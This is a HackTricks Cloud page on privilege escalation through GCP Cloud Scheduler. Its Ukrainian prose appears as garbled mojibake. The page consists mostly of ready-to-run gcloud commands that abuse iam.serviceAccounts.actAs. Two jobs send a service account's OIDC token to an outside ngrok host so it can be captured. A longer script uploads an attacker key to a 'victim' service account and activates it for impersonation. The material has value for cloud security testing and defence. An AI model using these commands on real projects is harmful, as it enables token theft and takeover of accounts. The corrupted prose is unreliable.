# GCP - Cloud Scheduler Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cloud Scheduler

–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤:

{% content-ref url="../gcp-services/gcp-cloud-scheduler-enum.md" %}
[gcp-cloud-scheduler-enum.md](../gcp-services/gcp-cloud-scheduler-enum.md)
{% endcontent-ref %}

### `cloudscheduler.jobs.create` , `iam.serviceAccounts.actAs`, (`cloudscheduler.locations.list`)

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **Cloud Scheduler** –¥–ª—è **–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó cron jobs —è–∫ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏**. –°—Ç–≤–æ—Ä—é—é—á–∏ HTTP POST –∑–∞–ø–∏—Ç, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø–ª–∞–Ω—É—î –¥—ñ—ó, —Ç–∞–∫—ñ —è–∫ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è Storage bucket, –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—ñ–¥ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—é –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏. –¶–µ–π –º–µ—Ç–æ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–º–æ–∂–ª–∏–≤—ñ—Å—Ç—å Scheduler –Ω–∞—Ü—ñ–ª—é–≤–∞—Ç–∏—Å—è –Ω–∞ `*.googleapis.com` –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ —Ç–∞ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –∑–∞–ø–∏—Ç–∏**, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –∫—ñ–Ω—Ü–µ–≤–∏–º–∏ —Ç–æ—á–∫–∞–º–∏ Google API –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–æ—Å—Ç–æ–≥–æ `gcloud` –∫–æ–º–∞–Ω–¥–∏.

* **–ó–≤'—è–∑–∞—Ç–∏—Å—è –∑ –±—É–¥—å-—è–∫–∏–º google API —á–µ—Ä–µ–∑ `googleapis.com` –∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–º —Ç–æ–∫–µ–Ω–∞ OAuth**

–°—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π Storage bucket:

{% code overflow="wrap" %}
```bash
gcloud scheduler jobs create http test --schedule='* * * * *' --uri='https://storage.googleapis.com/storage/v1/b?project=<PROJECT-ID>' --message-body "{'name':'new-bucket-name'}" --oauth-service-account-email 111111111111-compute@developer.gserviceaccount.com --headers "Content-Type=application/json" --location us-central1
```
{% endcode %}

–©–æ–± –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó, **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø—Ä–æ—Å—Ç–æ —Ñ–æ—Ä–º—É—î HTTP-–∑–∞–ø–∏—Ç, –Ω–∞—Ü—ñ–ª–µ–Ω–∏–π –Ω–∞ –ø–æ—Ç—Ä—ñ–±–Ω–∏–π API, –≤–∏–¥–∞—é—á–∏ —Å–µ–±–µ –∑–∞ –≤–∫–∞–∑–∞–Ω–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏**

* **–ï–∫—Å—Ç—Ä–∞–∫—Ü—ñ—è —Ç–æ–∫–µ–Ω–∞ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ OIDC**

{% code overflow="wrap" %}
```bash
gcloud scheduler jobs create http test --schedule='* * * * *' --uri='https://87fd-2a02-9130-8532-2765-ec9f-cba-959e-d08a.ngrok-free.app' --oidc-service-account-email 111111111111-compute@developer.gserviceaccount.com [--oidc-token-audience '...']

# Listen in the ngrok address to get the OIDC token in clear text.
```
{% endcode %}

### `cloudscheduler.jobs.update` , `iam.serviceAccounts.actAs`, (`cloudscheduler.locations.list`)

–Ø–∫ —ñ –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó, –º–æ–∂–ª–∏–≤–æ **–æ–Ω–æ–≤–∏—Ç–∏ –≤–∂–µ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –ø–ª–∞–Ω—É–≤–∞–ª—å–Ω–∏–∫**, —â–æ–± –≤–∫—Ä–∞—Å—Ç–∏ —Ç–æ–∫–µ–Ω –∞–±–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥—ñ—ó. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:

{% code overflow="wrap" %}
```bash
gcloud scheduler jobs update http test --schedule='* * * * *' --uri='https://87fd-2a02-9130-8532-2765-ec9f-cba-959e-d08a.ngrok-free.app' --oidc-service-account-email 111111111111-compute@developer.gserviceaccount.com [--oidc-token-audience '...']

# Listen in the ngrok address to get the OIDC token in clear text.
```
{% endcode %}

–Ü–Ω—à–∏–π –ø—Ä–∏–∫–ª–∞–¥ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ –¥–æ SA —Ç–∞ –π–æ–≥–æ —ñ–º—ñ—Ç–∞—Ü—ñ—ó:

{% code overflow="wrap" %}
```bash
# Generate local private key
openssl req -x509 -nodes -newkey rsa:2048 -days 365 \
-keyout /tmp/private_key.pem \
-out /tmp/public_key.pem \
-subj "/CN=unused"

# Remove last new line character of the public key
file_size=$(wc -c < /tmp/public_key.pem)
new_size=$((file_size - 1))
truncate -s $new_size /tmp/public_key.pem

# Update scheduler to upload the key to a SA
gcloud scheduler jobs update http scheduler_lab_1 \
--schedule='* * * * *' \
--uri="https://iam.googleapis.com/v1/projects/$PROJECT_ID/serviceAccounts/victim@$PROJECT_ID.iam.gserviceaccount.com/keys:upload?alt=json" \
--message-body="{\"publicKeyData\": \"$(cat /tmp/public_key.pem | base64)\"}" \
--update-headers "Content-Type=application/json" \
--location us-central1 \
--oauth-service-account-email privileged@$PROJECT_ID.iam.gserviceaccount.com

# Check the logs to check it worked

# Build the json to contact the SA
## Get privatekey in json format
file_content=$(<"/tmp/private_key.pem")
private_key_json=$(jq -Rn --arg str "$file_content" '$str')

## Get ID of the generated key
gcloud iam service-accounts keys list --iam-account=victim@$PROJECT_ID.iam.gserviceaccount.com

# Create the json in a file
{
"type": "service_account",
"project_id": "$PROJECT_ID",
"private_key_id": "<key id from key list>",
"private_key": "$private_key_json",
"client_email": "victim@$PROJECT_ID.iam.gserviceaccount.com",
"client_id": "$(gcloud iam service-accounts describe victim@$PROJECT_ID.iam.gserviceaccount.com | grep oauth2ClientId | cut -d "'" -f 2)",
"auth_uri": "https://accounts.google.com/o/oauth2/auth",
"token_uri": "https://oauth2.googleapis.com/token",
"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/victim%40$PROJECT_ID.iam.gserviceaccount.com",
"universe_domain": "googleapis.com"
}

# Activate the generated key
gcloud auth activate-service-account --key-file=/tmp/fake_key.json
```
{% endcode %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
